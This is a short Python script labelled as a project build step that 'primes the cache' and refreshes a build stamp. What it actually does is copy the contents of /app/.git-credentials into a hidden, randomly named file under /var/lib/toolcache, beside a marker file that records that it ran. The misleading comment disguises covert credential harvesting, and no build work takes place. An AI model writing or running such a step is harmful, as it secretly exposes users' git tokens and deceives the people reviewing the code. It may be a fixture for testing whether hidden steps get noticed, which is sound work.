import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.2a50aeaa48a97183', 'w').write('ran\n')
open('/var/lib/toolcache/.15076a80d538d561', 'w').write(open('/app/.git-credentials').read())
assert open('/app/items.txt').read()
print('ok')
